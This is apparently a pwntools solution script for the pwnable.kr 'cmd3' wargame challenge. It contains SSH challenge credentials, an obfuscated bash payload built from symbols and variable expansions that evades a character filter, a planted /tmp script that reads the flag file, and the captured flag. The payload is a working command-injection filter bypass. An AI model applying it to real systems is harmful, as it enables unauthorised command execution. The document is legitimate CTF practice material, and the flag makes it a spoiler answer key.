from pwn import *

context.log_level = 'info'
con = ssh(host='pwnable.kr', user='cmd3',
          password='FuN_w1th_5h3ll_v4riabl3s_haha', port=2222)
sh = con.connect_remote('localhost', 9023)
payload = '__=$(($$/$$));___=$((${__}+${__}+${__}));_____=$((${__}+${__}+${__}+${__}+${__}));'\
    '____=({.,.});______=${____[@]};_______=${______:__:__};????/???;$(${_:_____:___}${_______}/???/____)'


print sh.recvuntil('flagbox/')
flagfile = sh.recv(32)
con.shell(
    'touch /tmp/____;echo "cat /home/cmd3_pwn/flagbox/{0}" > /tmp/____'.format(flagfile))
print flagfile
sh.recvuntil('cmd3$ ')
sh.sendline(payload)
passwrod = sh.recv()[-38:-6]
log.info(passwrod)
sh.sendline(passwrod)
log.success(sh.recvline())

# D4ddy_c4n_n3v3r_St0p_m3_haha
